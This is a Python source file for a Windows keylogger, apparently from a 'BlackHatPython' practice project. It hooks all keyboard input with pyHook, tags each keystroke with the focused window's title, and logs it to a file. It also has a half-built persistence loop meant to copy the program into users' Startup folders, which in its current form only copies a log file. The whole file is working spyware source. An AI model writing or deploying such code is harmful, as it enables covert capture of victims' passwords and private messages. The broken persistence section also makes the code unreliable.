import pythoncom, pyHook, logging, win32gui, os, sys
#PyHook module is a library for Mouse/KB listeneres
#PyWin32 is a library that provides access to Windows functions


# Copy to startup
for user in os.listdir("C:\\Users\\"):
    file_path = sys.argv[0]
    print(file_path)
    # if (os.path.isdir(f"C:\\Users\\{user}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")) == True:
    os.popen(f"copy log.txt log3.txt")
    log_file =r"C:\Users\Steven\PycharmProjects\BlackHatPython\log.txt"


def hook():
    keyboard = pyHook.HookManager()
    keyboard.KeyDown = keyListener
    keyboard.HookKeyboard()
    pythoncom.PumpMessages()


def keyListener(event):
    # Get the name of the focused application window
    focus = win32gui.GetForegroundWindow()
    window_name = win32gui.GetWindowText(focus)
    # Perform logging of text
    logging.basicConfig(filename=log_file,
                        level=logging.INFO,
                        format="%(asctime)s | {} | %(message)s".format(window_name))

    if event.Ascii == 8:
        msg = '[BACKSPACE]'
    elif event.Ascii == 9:
        msg = '[TAB]'
    elif event.Ascii == 13:
        msg = '[RETURN]'
    else:
         msg = chr(event.Ascii)

    logging.log(level=20, msg=msg)
    return True


if __name__ == '__main__':
    while True:
        hook()
